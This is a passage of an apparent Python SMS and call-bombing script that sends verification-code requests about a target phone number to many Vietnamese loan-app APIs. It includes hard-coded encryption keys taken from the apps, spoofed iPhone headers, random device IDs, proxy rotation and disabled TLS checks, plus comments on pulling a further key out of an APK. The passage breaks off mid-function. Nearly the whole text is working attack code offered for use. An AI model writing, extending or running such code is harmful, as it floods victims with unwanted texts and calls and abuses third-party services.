        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": f"{_ITAKE_BASE}/login", "country": "undefined",
        "fpDeviceId": device_id, "deviceId": device_id, "version": "1.0.0_4.0.4",
        "fingerPrint": "", "platform": "2", "token": "undefined",
        "loginPlatform": "H5", "marketToken": "undefined",
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
    }
    get_h  = {**base_h, "Accept": "*/*", "x_x_path": _vvay_encrypt_path("/login")}
    post_h = {
        **base_h, "Accept": "application/json", "Content-Type": "application/json",
        "Origin": _ITAKE_BASE, "x_x_path": _vvay_encrypt_path("/login/requestVerifyCode"),
    }
    body = _vvay_encrypt({"phone": mobile, "isVoice": True, "h5": False, "deviceId": device_id})
    try:
        async with _make_client(timeout=20) as client:
            await client.get(
                f"{_ITAKE_BASE}/h5/{check_id}", headers=get_h, params={"phone": mobile}
            )
            r = await client.post(
                f"{_ITAKE_BASE}/h5/{device_id}", headers=post_h, content=body.encode()
            )
        try:
            resp = _vvay_decrypt(r.text)
            ok = resp.get("successful") is True or resp.get("code") == 200
            if ok:
                print(f"[ITake] ✅ OK")
            else:
                print(f"[ITake] ❌ {resp.get('msg') or r.text[:100]}")
        except Exception:
            ok = r.status_code == 200
            print(f"[ITake] {'✅ OK' if ok else f'❌ HTTP {r.status_code}: {r.text[:100]}'}")
        return ok
    except Exception as e:
        print(f"[ITake] ERR {type(e).__name__}: {e}")
        return False



_VNCREDIT_KEY = b"tdbdif7653scbvy4"
_VNCREDIT_DEVICE_IDS: dict = {}


def _vncredit_encrypt(data: dict) -> dict:
    raw = json.dumps(data, separators=(",", ":")).encode()
    enc = base64.b64encode(AES.new(_VNCREDIT_KEY, AES.MODE_ECB).encrypt(pad(raw, 16))).decode()
    return {"JXTbpertIbc": enc}


def _vncredit_decrypt(resp_json: dict) -> dict:
    try:
        enc = resp_json.get("JXTbpertIbc", "")
        raw = base64.b64decode(enc)
        return json.loads(unpad(AES.new(_VNCREDIT_KEY, AES.MODE_ECB).decrypt(raw), 16).decode())
    except Exception:
        return resp_json


def _vncredit_device_id(phone: str) -> str:
    if phone not in _VNCREDIT_DEVICE_IDS:
        _VNCREDIT_DEVICE_IDS[phone] = str(random.randint(10000000, 99999999))
    return _VNCREDIT_DEVICE_IDS[phone]


def _vncredit_headers(phone: str) -> dict:
    return {
        "Content-Type": "application/json",
        "arHZCqdXMe": "",
        "DJDVItHEOpT": "",
        "TcJSztVvHI": "in",
        "vMdkYlySgyVn": "cn.ivay.h5.viet",
        "BCCpGTCULBU": _vncredit_device_id(phone),
        "xAfAyxfEVv": "",
        "oqBfkSWOjSw": "1",
        "fbcId": "",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
        ),
    }


async def Call_VnCreSms(phone):
    try:
        ts = str(int(time.time() * 1000))
        headers = {**_vncredit_headers(phone), "arHZCqdXMe": ts, "xAfAyxfEVv": phone}
        async with httpx.AsyncClient(timeout=20, verify=False) as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/GOifgUPDRz",
                json=_vncredit_encrypt({"mobile": phone, "type": "1"}),
                headers=headers,
            )
        d = _vncredit_decrypt(r.json())
        ok = d.get("code") == 0
        if ok:
            print(f"[VNCredit-SMS] ✅ OK")
        else:
            print(f"[VNCredit-SMS] ❌ {d.get('message') or d.get('msg') or r.text[:100]}")
        return ok
    except Exception as e:
        print(f"[VNCredit-SMS] ERR {type(e).__name__}: {e}")
        return False


async def Call_VNCreCall(phone):
    try:
        ts = str(int(time.time() * 1000))
        headers = {**_vncredit_headers(phone), "arHZCqdXMe": ts, "xAfAyxfEVv": phone}
        async with httpx.AsyncClient(timeout=20, verify=False) as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/vCqfJYeweB",
                json=_vncredit_encrypt({"mobile": phone, "type": "2"}),
                headers=headers,
            )
        d = _vncredit_decrypt(r.json())
        ok = d.get("code") == 0
        if ok:
            print(f"[VNCredit-Voice] ✅ OK")
        else:
            print(f"[VNCredit-Voice] ❌ {d.get('message') or d.get('msg') or r.text[:100]}")
        return ok
    except Exception as e:
        print(f"[VNCredit-Voice] ERR {type(e).__name__}: {e}")
        return False



# ── Vay24h ──
_VAY24H_AES_KEY  = b"5vB8^yC1&zF3*hJ9"
_VAY24H_AES_SIGN = "0f656af82eb1da33221a06d1171db265"
_VAY24H_AES_PKG  = "com.loan.uvwalleth5ios"
_VAY24H_AES_BASE = "https://h5.vay24h.vip"
_VAY24H_AES_HDRS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Content-Language": "vn",
    "system": "ios", "deviceType": "h5", "w": "1170", "h": "2532",
    "appcodename": "Mozilla", "appname": "Netscape",
    "appversion": "5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "platform": "iPhone", "vendor": "Apple Computer, Inc.",
    "screenresolution": "1170,2532",
    "Origin": "https://h5.vay24h.vip",
    "Referer": "https://h5.vay24h.vip/login",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Accept-Language": "vi-VN,vi;q=0.9",
    "Accept-Encoding": "identity",
    "Connection": "keep-alive",
}


def _vay24h_aes_enc(data: dict) -> str:
    ct = AES.new(_VAY24H_AES_KEY, AES.MODE_ECB).encrypt(
        pad(json.dumps(data, separators=(",", ":")).encode(), 16)
    )
    return base64.b64encode(ct).decode()

def _vay24h_common(imei: str) -> dict:
    now = time.time()
    return {
        "timestamp": int(now),
        "nonce": "".join(random.choices(string.ascii_letters + string.digits, k=8)),
        "referrer": "utm_source=null",
        "af_prt": None,
        "sign": _VAY24H_AES_SIGN,
        "appversion": "1.0.0",
        "channel": "1",
        "app_version": "1.0.0",
        "version": "1.0.0",
        "imei": imei,
        "uuid": imei,
        "pkg_name": _VAY24H_AES_PKG,
        "download_time": f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(now))}.000",
    }


async def Call_Vay24h(phone):
    imei = hashlib.md5(uuid.uuid4().bytes).hexdigest()
    ts = int(time.time() * 1000)
    sign = hashlib.md5(str(ts).encode()).hexdigest()
    try:
        async with httpx.AsyncClient(timeout=30, verify=False) as client:
            body = {
                "phone": phone, "type": 2, "timestamp": ts,
                "referrer": "utm_source=null", "af_prt": None, "sign": sign,
                "appversion": "1.0.0", "channel": "1", "app_version": "1.0.0",
                "version": "1.0.0", "imei": imei, "uuid": imei,
                "pkg_name": _VAY24H_AES_PKG,
            }
            r = await client.post(
                f"{_VAY24H_AES_BASE}/api/register/app/sendSms",
                headers=_VAY24H_AES_HDRS,
                json=body,
            )
            try:
                d = r.json()
                ok = str(d.get("code", "")) in ("200", "0") or d.get("code") in (200, 0)
                if ok:
                    print(f"[Vay24h] ✅ OK")
                else:
                    print(f"[Vay24h] ❌ {d.get('message') or d.get('msg') or r.text[:100]}")
            except Exception:
                ok = r.status_code == 200
                print(f"[Vay24h] {'✅ OK' if ok else f'❌ HTTP {r.status_code}'}")
            return ok
    except Exception as e:
        print(f"[Vay24h] ERR {type(e).__name__}: {e}")
        return False


# ── VayDep365 ──
_VAYDEP_AES_KEY  = b"8fA2#kD9!xL7@mN3"
_VAYDEP_AES_SIGN = "0f656af82eb1da33221a06d1171db265"
_VAYDEP_AES_PKG  = "com.vch.vaychungh5ios"
_VAYDEP_AES_BASE = "https://h5.vaydep365.com"
_VAY_DEP365_URLS = [
    "https://ndnndfndndbb--28fa0824520211f1bae0ee650bb23af1.web.val.run",
    "https://wander6fb5.xadoa8.workers.dev/vaydep365",
    "https://verceldeploy-one-phi.vercel.app/api/vaydep",
]
_VAYDEP_AES_HDRS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Content-Language": "vn",
    "system": "ios", "deviceType": "h5", "w": "1170", "h": "2532",
    "appcodename": "Mozilla", "appname": "Netscape",
    "appversion": "5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "platform": "iPhone", "vendor": "Apple Computer, Inc.",
    "screenresolution": "1170,2532",
    "Origin": "https://h5.vaydep365.com",
    "Referer": "https://h5.vaydep365.com/login",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Accept-Language": "vi-VN,vi;q=0.9",
    "Accept-Encoding": "identity",
    "Connection": "keep-alive",
}


def _vaydep_aes_enc(data: dict) -> str:
    ct = AES.new(_VAYDEP_AES_KEY, AES.MODE_ECB).encrypt(
        pad(json.dumps(data, separators=(",", ":")).encode(), 16)
    )
    return base64.b64encode(ct).decode()


def _vaydep_aes_common(imei: str) -> dict:
    now = time.time()
    return {
        "timestamp": int(now),
        "nonce": "".join(random.choices(string.ascii_letters + string.digits, k=8)),
        "referrer": "utm_source=null",
        "af_prt": None,
        "sign": _VAYDEP_AES_SIGN,
        "appversion": "1.0.0",
        "channel": "1",
        "app_version": "1.0.0",
        "version": "1.0.0",
        "imei": imei,
        "uuid": imei,
        "pkg_name": _VAYDEP_AES_PKG,
        "download_time": f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(now))}.000",
    }


async def Call_VayDep365(phone):
    imei = hashlib.md5(uuid.uuid4().bytes).hexdigest()
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, verify=False) as client:
            r1 = await client.post(
                f"{_VAYDEP_AES_BASE}/api/comm/downoknotify",
                headers=_VAYDEP_AES_HDRS,
                json={**_vaydep_aes_common(imei), "type": 1},
            )
            d1 = {}
            try:
                d1 = r1.json()
            except Exception:
                pass
            if d1.get("code") not in ("200", 200):
                return False
            enc_data = _vaydep_aes_enc({
                "phone": phone, "type": "1",
                "pkg_name": _VAYDEP_AES_PKG, "voice": "0", "reApply": "",
            })
            r2 = await client.post(
                f"{_VAYDEP_AES_BASE}/api/register/h5/sendSms",
                headers=_VAYDEP_AES_HDRS,
                json={"encryptedData": enc_data, "pkg_name": _VAYDEP_AES_PKG},
            )
            return r2.status_code == 200
    except Exception as e:
        print(f"[VayDep365] ERR {type(e).__name__}: {e}")
        return False


# ── UVWallet / SaoThinhVuong (cùng pattern Vay24h-ECB) ──
async def Call_UVWallet(phone):
    try:
        headers = {
            "User-Agent": random.choice(_XMH_UA_POOL),
            "deviceType": "h5", "channel": "",
            "appversion": random.choice(_XMH_UA_POOL),
            "vendor": "Apple Computer, Inc.",
            "Origin": "https://h5.uvwalletvn.com",
            "Referer": "https://h5.uvwalletvn.com/login",
            "Sec-Fetch-Dest": "empty", "h": "2532", "system": "ios",
            "Sec-Fetch-Site": "same-origin", "w": "1170",
            "appname": "Netscape", "platform": "iPhone",
            "appcodename": "Mozilla", "screenresolution": "1170,2532",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Content-Language": "vn", "Sec-Fetch-Mode": "cors",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "identity", "Connection": "keep-alive",
        }
        ts   = int(time.time() * 1000)
        imei = hashlib.md5(str(random.random()).encode()).hexdigest()
        sign = hashlib.md5(str(ts).encode()).hexdigest()
        body = {
            "phone": phone, "type": 2, "timestamp": ts,
            "referrer": "utm_source=null", "af_prt": None, "sign": sign,
            "appversion": "1.0.0", "channel": "1", "app_version": "1.0.0",
            "version": "1.0.0", "imei": imei, "uuid": imei,
            "pkg_name": "com.loan.uvwalleth5ios",
        }
        async with _make_client() as client:
            r = await client.post(
                "https://h5.uvwalletvn.com/api/register/app/sendSms",
                headers=headers, json=body,
            )
        return r.status_code == 200
    except Exception as e:
        print(f"[UVWallet] ERR {type(e).__name__}: {e}")
        return False


async def Call_SaoThinhVuong(phone):
    try:
        headers = {
            "User-Agent": random.choice(_XMH_UA_POOL),
            "deviceType": "h5", "channel": "",
            "appversion": random.choice(_XMH_UA_POOL),
            "vendor": "Apple Computer, Inc.",
            "Origin": "https://h5.saothinhvuong.cc",
            "Referer": "https://h5.saothinhvuong.cc/login",
            "Sec-Fetch-Dest": "empty", "h": "2532", "system": "ios",
            "Sec-Fetch-Site": "same-origin", "w": "1170",
            "appname": "Netscape", "platform": "iPhone",
            "appcodename": "Mozilla", "screenresolution": "1170,2532",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Content-Language": "vn", "Sec-Fetch-Mode": "cors",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "identity", "Connection": "keep-alive",
        }
        ts16   = int(time.time() * 1000)
        imei16 = hashlib.md5(str(random.random()).encode()).hexdigest()
        sign16 = hashlib.md5(str(ts16).encode()).hexdigest()
        body = {
            "phone": phone, "type": 2, "timestamp": ts16,
            "referrer": "utm_source=null", "af_prt": None, "sign": sign16,
            "appversion": "1.0.0", "channel": "1", "app_version": "1.0.0",
            "version": "1.0.0", "imei": imei16, "uuid": imei16,
            "pkg_name": "com.loan.starwarsh5ios",
        }
        async with _make_client() as client:
            r = await client.post(
                "https://h5.saothinhvuong.cc/api/register/app/sendSms",
                headers=headers, json=body,
            )
        return r.status_code == 200
    except Exception as e:
        print(f"[SaoThinhVuong] ERR {type(e).__name__}: {e}")
        return False


_MUAVAY_AES_KEY = b"IYFlUR+o0ec3uRlg2fhUzQ=="  # 24 bytes → AES-192


def _muavay_enc(data: dict) -> str:
    ct = AES.new(_MUAVAY_AES_KEY, AES.MODE_ECB).encrypt(
        pad(json.dumps(data, separators=(",", ":")).encode(), 16)
    )
    return base64.b64encode(ct).decode()


def _muavay_dec(b64_cipher: str) -> dict:
    try:
        raw = base64.b64decode(b64_cipher)
        pt = unpad(AES.new(_MUAVAY_AES_KEY, AES.MODE_ECB).decrypt(raw), 16)
        return json.loads(pt.decode())
    except Exception:
        return {}


async def Call_MuaVayLoan(phone):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "language": "vi_vn", "appType": "1", "osType": "1",
            "Origin": "https://www.muavayloan.top",
            "Referer": "https://www.muavayloan.top/",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "identity", "Connection": "keep-alive",
        }
        body = {"key": _muavay_enc({"smsType": "1", "phone": phone, "loanProductName": "Mua_Vay"})}
        async with httpx.AsyncClient(timeout=20, http2=False, verify=False) as client:
            r = await client.post(
                "https://www.muavayloan.top/app-gateway/api/operator/opt/send",
                headers=headers, json=body,
            )
        d = {}
        try:
            outer = r.json()
            d = _muavay_dec(outer["key"]) if "key" in outer else outer
            code = d.get("code")
            ok = d.get("ok") is True or code == 1 or str(code) in ("200", "0")
        except Exception:
            ok = r.status_code == 200
        if ok:
            print(f"[MuaVayLoan] ✅ OK")
        else:
            msg = d.get("message") or d.get("msg") or r.text[:100]
            print(f"[MuaVayLoan] ❌ {msg}")
        return bool(ok)
    except Exception as e:
        print(f"[MuaVayLoan] ERR {type(e).__name__}: {e}")
        return False


async def Call_MoneyCashLoan(phone):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "language": "vi_vn", "appType": "1", "osType": "1",
            "Origin": "http://www.moneycashloan.top",
            "Referer": "http://www.moneycashloan.top/",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "identity", "Connection": "keep-alive",
        }
        body = {"key": _muavay_enc({"smsType": "1", "phone": phone, "loanProductName": "Money_Cash"})}
        async with httpx.AsyncClient(timeout=20, http2=False, verify=False) as client:
            r = await client.post(
                "http://www.moneycashloan.top/app-gateway/api/operator/opt/send",
                headers=headers, json=body,
            )
        d = {}
        try:
            d = _muavay_dec(r.json().get("key", ""))
            ok = d.get("ok") is True or d.get("code") in (1, 200, "200", "0")
        except Exception:
            ok = r.status_code == 200
        if ok:
            print(f"[MoneyCashLoan] ✅ OK")
        else:
            msg = d.get("message") or d.get("msg") or r.text[:100]
            print(f"[MoneyCashLoan] ❌ {msg}")
        return bool(ok)
    except Exception as e:
        print(f"[MoneyCashLoan] ERR {type(e).__name__}: {e}")
        return False


async def Call_NganNgan(phone):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "language": "vi_vn", "appType": "1", "osType": "1",
            "Origin": "http://www.nganngan.top",
            "Referer": "http://www.nganngan.top/",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "identity", "Connection": "keep-alive",
        }
        body = {"key": _muavay_enc({"smsType": "1", "phone": phone, "loanProductName": "Ngan_Vay"})}
        async with httpx.AsyncClient(timeout=20, http2=False, verify=False) as client:
            r = await client.post(
                "http://www.nganngan.top/app-gateway/api/operator/opt/send",
                headers=headers, json=body,
            )
        d = {}
        try:
            d = _muavay_dec(r.json().get("key", ""))
            ok = d.get("ok") is True or d.get("code") in (1, 200, "200", "0")
        except Exception:
            ok = r.status_code == 200
        if ok:
            print(f"[NganNgan] ✅ OK")
        else:
            msg = d.get("message") or d.get("msg") or r.text[:100]
            print(f"[NganNgan] ❌ {msg}")
        return bool(ok)
    except Exception as e:
        print(f"[NganNgan] ERR {type(e).__name__}: {e}")
        return False


# ══════════════════════════════════════════════════════════════════════════════
# NHÓM 6 — FINVUITECH AES-ECB
# ══════════════════════════════════════════════════════════════════════════════

_FinVui_KEY = b"r3gk088TfheCv47F"


def _finvui_enc(obj, key: bytes) -> str:
    if isinstance(obj, (dict, list)):
        obj = json.dumps(obj, separators=(",", ":"), ensure_ascii=False)
    ct = AES.new(key, AES.MODE_ECB).encrypt(pad(obj.encode(), 16))
    return base64.b64encode(ct).decode()


def _finvui_dec(ct_b64: str, key: bytes):
    raw = AES.new(key, AES.MODE_ECB).decrypt(base64.b64decode(ct_b64))
    text = unpad(raw, 16).decode()
    try:
        return json.loads(text)
    except Exception:
        return text


async def Call_FinVuiTeck(phone):
    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    body_plain = {"businessType": "login", "channelType": "1", "mobile": mobile}
    short_path = "/api/code/sendCode"
    try:
        async with _make_client(timeout=20) as client:
            r = await client.post(
                "https://api.finvuitech.com/fapi/u21w1id1sjw27hq7e2780rm9c8mjqh2d",
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Origin": "http://h5.finvuitech.com",
                    "Referer": "http://h5.finvuitech.com/",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
                    "Accept-Language": "vi-VN,vi;q=0.9",
                    "gutjqidj": _finvui_enc(short_path, _FinVui_KEY),
                    "yxshibrd": "2", "h5-version": "1.2.1",
                    "nshjghxq": "105", "cojjaqbq": "14",
                    "ncycfrss": "h5123456789", "isvpfpui": "FV",
                    "fzwdwroz": "", "version": "1.0.0",
                    "deviceId": "", "x-language": "vn", "appLanguage": "vn",
                },
                content=_finvui_enc(body_plain, _FinVui_KEY),
            )
        try:
            resp = _finvui_dec(r.text, _FinVui_KEY)
            if isinstance(resp, dict):
                ok = str(resp.get("code", "")) in ("0", "200") or resp.get("success") is True
                if ok:
                    print(f"[FinVuiTeck] ✅ OK")
                else:
                    print(f"[FinVuiTeck] ❌ {resp.get('message') or resp.get('msg') or r.text[:100]}")
            else:
                ok = r.status_code == 200
                print(f"[FinVuiTeck] {'✅ OK' if ok else f'❌ HTTP {r.status_code}: {r.text[:100]}'}")
        except Exception:
            ok = r.status_code == 200
            print(f"[FinVuiTeck] {'✅ OK' if ok else f'❌ HTTP {r.status_code}'}")
        return ok
    except Exception as e:
        print(f"[FinVuiTeck] ERR {type(e).__name__}: {e}")
        return False


_BANANA_RSA_PUB = RSA.import_key(
    "-----BEGIN PUBLIC KEY-----\n"
    "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCf2LshP9miHsmcC4FtbGsOgwla\n"
    "MHHL3VLa8ervlaYY5/fw4yOYdsgnYqr7Wu+OfM2GWCnVFzpVjzxAuwpKPlMcMnUR\n"
    "NNhD9LwJN9eaGVX3A6OXpJjmPu3NmhSQB4Tdi7so/0Vb+WCFbsw1x6OO+Zs0+zm\n"
    "RS5WWL3JDfXYyxozA3QIDAQAB\n"
    "-----END PUBLIC KEY-----"
)


def _pkcs7_pad(data, bs=16):
    p = bs - len(data) % bs
    return data + bytes([p] * p)


def _banana_rnd_key() -> str:
    return "".join(
        random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=16)
    )

async def _banana_send(
    phone: str, url: str, loan_name: str, label: str, use_proxy: bool = True
) -> bool:
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    def _rsa_enc(k: str) -> str:
        return base64.b64encode(RSA_PKCS1.new(_BANANA_RSA_PUB).encrypt(k.encode())).decode()

    def _aes_enc(payload: dict, k: str) -> str:
        raw = json.dumps(payload, separators=(",", ":")).encode()
        ct = AES.new(k.encode(), AES.MODE_ECB).encrypt(_pkcs7_pad(raw))
        return base64.b64encode(ct).decode()

    def _hdrs(k: str) -> dict:
        return {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "language": "vi_vn", "appType": "1", "osType": "1",
            "Origin": origin, "Referer": origin + "/",
            "NEW_APP_ENC": _rsa_enc(k),
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        }

    event_url = f"{origin}/app-domain/api/burying/unauthenticated/event"
    _client_kw: dict[str, Any] = dict(follow_redirects=True, verify=False)
    if use_proxy:
        _client_kw["proxy"] = _current_proxy()
    else:
        _client_kw["proxy"] = None
    try:
        async with _make_client(**_client_kw) as client:
            try:
                k1 = _banana_rnd_key()
                await client.post(
                    event_url, headers=_hdrs(k1),
                    json={"key": _aes_enc(
                        {"eventKey": "LOGIN_SMS", "packageName": loan_name, "phone": phone}, k1
                    )},
                    timeout=8,
                )
            except Exception:
                pass
            k2 = _banana_rnd_key()
            r = await client.post(
                url, headers=_hdrs(k2),
                json={"key": _aes_enc(
                    {"smsType": "1", "phone": phone, "loanProductName": loan_name}, k2
                )},
                timeout=20,
            )
        try:
            dec = AES.new(k2.encode(), AES.MODE_ECB).decrypt(base64.b64decode(r.json()["key"]))
            dec = json.loads(dec[: -dec[-1]])
            ok = bool(dec.get("ok") or str(dec.get("code", "")) in ("0", "1", "200"))
            msg = dec.get("message") or dec.get("msg") or ""
        except Exception:
            ok = r.status_code == 200
            msg = r.text[:80]
        if ok:
            print(f"[{label}] ✅ OK")
        else:
            print(f"[{label}] ❌ {msg}")
        return ok
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
        return False


_HEDGYV_API = "https://api.hedgyv.com"
_HEDGYV_H5  = "http://h5.hedgyv.com"

# RSA public key của app com.hedgyv.loan (lấy từ APK / traffic intercept)
# Server Go dùng crypto/rsa để DECRYPT body — client phải ENCRYPT bằng key này
# Điền key vào đây sau khi extract từ APK:
#   unzip hedgyv.apk → grep -r "MII" assets/ hoặc strings lib/*.so
_HEDGYV_RSA_PUBKEY_B64 = (
    ""  # TODO: paste base64 public key (PKCS#8 hoặc PKCS#1) tại đây
)

_HEDGYV_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "language": "vi_vn",
    "appType": "1",
    "osType": "1",
    "Origin": _HEDGYV_H5,
    "Referer": _HEDGYV_H5 + "/",
    "User-Agent": "okhttp/4.9.0",
    "Accept-Encoding": "gzip",
}


def _hedgyv_rsa_encrypt(body_dict: dict) -> str:
    """
    Encrypt JSON body bằng RSA public key của hedgyv.
    Server Go dùng rsa.DecryptPKCS1v15 để decrypt field "key" trong body JSON.
    Format gửi lên: {"key": "<base64_rsa_ciphertext>"}
    Output: base64 string của RSA ciphertext (để wrap vào {"key": ...}).
    """
    raw_json = json.dumps(body_dict, separators=(",", ":"), ensure_ascii=False)
    key_der = base64.b64decode(_HEDGYV_RSA_PUBKEY_B64)
    pub_key = RSA.import_key(key_der)
    cipher = PKCS1_v1_5.new(pub_key)
    encrypted = cipher.encrypt(raw_json.encode("utf-8"))
    return base64.b64encode(encrypted).decode()


async def Call_Hedgyv(phone: str) -> bool:
    if phone.startswith("+84"):
        phone = "0" + phone[3:]
    elif phone.startswith("84") and len(phone) == 11:
        phone = "0" + phone[2:]

    if not _HEDGYV_RSA_PUBKEY_B64:
        print("[Hedgyv] SKIP — chưa có RSA public key (lấy từ APK com.hedgyv.loan)")
        return False

    try:
        sms_enc = _hedgyv_rsa_encrypt({
            "smsType": "1",
            "phone": phone,
            "loanProductName": "hedgy",
        })
        burying_enc = _hedgyv_rsa_encrypt({
            "eventKey": "LOGIN_SMS",
            "packageName": "hedgy",
            "phone": phone,
        })

        async with _make_client(follow_redirects=True, verify=False) as client:
            try:
                await client.post(
                    f"{_HEDGYV_API}/burying/unauthenticated/event",
                    headers=_HEDGYV_HEADERS,
                    json={"key": burying_enc},
                    timeout=8,
                )
            except Exception:
                pass

            r = await client.post(
                f"{_HEDGYV_API}/user/sentSms",
                headers=_HEDGYV_HEADERS,
                json={"key": sms_enc},
                timeout=20,
            )

        print(f"[Hedgyv] {phone} → {r.status_code} | {r.text[:120]}")
        if r.status_code == 200:
            try:
                d = r.json()
                return str(d.get("code", "")) in ("0", "1", "200") or d.get("ok")
            except Exception:
                return True
        return False

    except Exception as e:
        print(f"[Hedgyv] ERR {type(e).__name__}: {e}")
        return False


async def sentSms1(phone):
    return await _banana_send(
        phone, "http://www.moneymua.top/app-domain/api/user/sentSms", "Money_Mua", "moneymua",
        use_proxy=False,
    )


async def sentSms_FvBanana(phone):
    return await _banana_send(
        phone, "https://www.fvbanana.top/app-domain/api/user/sentSms", "Fast_Vay", "fvbanana"
    )


# ── Tien24h ──
_T24H_BASE = "https://api.tien-24h.com"
_T24H_L = hashlib.md5(b"tien24hh5").hexdigest()
_T24H_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "platform": "h5", "app-version": "1.0.0", "lang": "vi_VN",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Origin": "https://h5.tien-24h.com", "Referer": "https://h5.tien-24h.com/",
    "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
    "Accept-Language": "vi-VN,vi;q=0.9", "Accept-Encoding": "gzip, deflate, br",
}

# ── Tien24h Pro ──
_T24HPRO_BASE = "https://api.tien-24h.com"
_T24HPRO_L = hashlib.md5(b"tien24hpro").hexdigest()
_T24HPRO_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "platform": "h5", "app-version": "1.0.0", "lang": "vi_VN",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Origin": "https://www.tien24hpro.com", "Referer": "https://www.tien24hpro.com/",
    "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
    "Accept-Language": "vi-VN,vi;q=0.9", "Accept-Encoding": "gzip, deflate, br",
}


def _t24h_yr(obj):
    if isinstance(obj, dict):
        return {k: _t24h_yr(obj[k]) for k in sorted(obj.keys())}
    return obj


async def Call_ConCac27(phone):
    appcheck_tok = _load_appcheck_token("tien24h")
    if not appcheck_tok:
        return False
    body = {"appCode": "tien24hh5", "version": "1.0.0", "mobileType": "1", "phone": phone}
    try:
        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
            rs = await client.get(
                f"{_T24H_BASE}/api/user/app/common/secret",
                headers=_T24H_HEADERS,
                params={"appCode": "tien24hh5", "version": "1.0.0", "mobileType": "1"},
            )
            secret = ""
            if rs.status_code == 200:
                secret = (rs.json().get("data") or {}).get("verifySignSecret", "")
            jsessionid = rs.cookies.get("JSESSIONID", "")
            if not jsessionid:
                import re as _re
                m = _re.search(r"JSESSIONID=([^;]+)", rs.headers.get("set-cookie", ""))
                if m:
                    jsessionid = m.group(1)
            ts = int(time.time() * 1000)
            sorted_body = json.dumps(_t24h_yr(body), separators=(",", ":"))
